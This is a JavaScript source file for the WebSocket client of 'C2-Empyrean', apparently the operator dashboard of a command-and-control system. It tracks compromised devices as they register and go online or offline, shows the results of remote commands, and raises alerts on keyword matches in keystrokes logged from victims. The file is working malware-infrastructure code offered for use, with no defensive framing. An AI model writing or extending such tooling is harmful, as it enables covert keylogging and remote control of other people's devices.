/**
 * C2-Empyrean - WebSocket Client
 * Real-time communication for live device updates, commands, and alerts
 */

class C2WebSocket {
    constructor(url, options = {}) {
        this.url = url;
        this.options = {
            reconnectInterval: 5000,
            maxReconnectAttempts: 20,
            debug: false,
            ...options
        };
        this.ws = null;
        this.reconnectAttempts = 0;
        self = this;
        this.handlers = {};
        this.connected = false;
        this.connect();
    }

    connect() {
        try {
            this.ws = new WebSocket(this.url);
            this.ws.onopen = () => this.onOpen();
            this.ws.onclose = (e) => this.onClose(e);
            this.ws.onerror = (e) => this.onError(e);
            this.ws.onmessage = (e) => this.onMessage(e);
        } catch (err) {
            this.log('Connection error:', err);
            this.scheduleReconnect();
        }
    }

    onOpen() {
        this.log('Connected');
        this.connected = true;
        this.reconnectAttempts = 0;
        this.emit('connected', {});
    }

    onClose(event) {
        this.log('Disconnected:', event.code, event.reason);
        this.connected = false;
        this.emit('disconnected', { code: event.code, reason: event.reason });
        this.scheduleReconnect();
    }

    onError(event) {
        this.log('Error:', event);
        this.emit('error', event);
    }

    onMessage(event) {
        try {
            const data = JSON.parse(event.data);
            this.log('Message:', data.type, data);
            this.emit(data.type, data.payload || data);

            // Handle common event types
            switch (data.type) {
                case 'device_online':
                    this.emit('device_update', data.payload);
                    break;
                case 'device_offline':
                    this.emit('device_update', data.payload);
                    break;
                case 'new_device':
                    this.emit('device_new', data.payload);
                    showToast('New device registered: ' + (data.payload?.device_id || ''), 'success');
                    break;
                case 'command_result':
                    this.emit('command_result', data.payload);
                    break;
                case 'keylog_alert':
                    this.emit('keylog_alert', data.payload);
                    showToast('🔑 Keyword match on ' + (data.payload?.device_id || 'device'), 'warning');
                    break;
                case 'heartbeat':
                    this.emit('heartbeat', data.payload);
                    break;
                case 'alert':
                    showToast(data.payload?.message || 'Alert received', data.payload?.level || 'info');
                    break;
                default:
                    break;
            }
        } catch (err) {
            this.log('Parse error:', err);
        }
    }

    send(type, payload = {}) {
        if (!this.connected) {
            this.log('Cannot send - not connected');
            return false;
        }
        try {
            const msg = JSON.stringify({ type, payload, timestamp: Math.floor(Date.now() / 1000) });
            this.ws.send(msg);
            return true;
        } catch (err) {
            this.log('Send error:', err);
            return false;
        }
    }

    on(event, handler) {
        if (!this.handlers[event]) this.handlers[event] = [];
        this.handlers[event].push(handler);
    }

    off(event, handler) {
        if (!this.handlers[event]) return;
        this.handlers[event] = this.handlers[event].filter(h => h !== handler);
    }

    emit(event, data) {
        const handlers = this.handlers[event] || [];
        handlers.forEach(h => {
            try { h(data); } catch (err) { this.log('Handler error:', err); }
        });
    }

    scheduleReconnect() {
        if (this.reconnectAttempts >= this.options.maxReconnectAttempts) {
            this.log('Max reconnect attempts reached');
            this.emit('reconnect_failed', {});
            return;
        }

        this.reconnectAttempts++;
        const delay = Math.min(
            this.options.reconnectInterval * Math.pow(1.5, this.reconnectAttempts - 1),
            30000
        );

        this.log('Reconnecting in ' + delay + 'ms (attempt ' + this.reconnectAttempts + ')');
        this.emit('reconnecting', { attempt: this.reconnectAttempts, delay });

        setTimeout(() => this.connect(), delay);
    }

    disconnect() {
        this.reconnectAttempts = Infinity; // Prevent reconnect
        if (this.ws) {
            this.ws.close(1000, 'Client disconnect');
            this.ws = null;
        }
        this.connected = false;
    }

    log(...args) {
        if (this.options.debug) {
            console.log('[C2WS]', ...args);
        }
    }
}

// Auto-initialize if we're on a page that needs WebSocket
document.addEventListener('DOMContentLoaded', function() {
    const wsEndpoint = document.body.dataset.wsEndpoint;
    if (wsEndpoint) {
        window.c2ws = new C2WebSocket(wsEndpoint, { debug: false });

        window.c2ws.on('device_update', (data) => {
            // Trigger dashboard refresh if on dashboard
            if (typeof loadDashboardStats === 'function') {
                loadDashboardStats();
            }
            // Refresh device list if on devices page
            if (typeof loadDeviceList === 'function') {
                loadDeviceList();
            }
        });

        window.c2ws.on('command_result', (data) => {
            if (typeof appendToConsole === 'function') {
                appendToConsole('output', '📨 ' + (data.result || 'Command completed'));
            }
        });

        window.c2ws.on('keylog_alert', (data) => {
            if (typeof loadNotifications === 'function') {
                loadNotifications();
            }
        });
    }
});
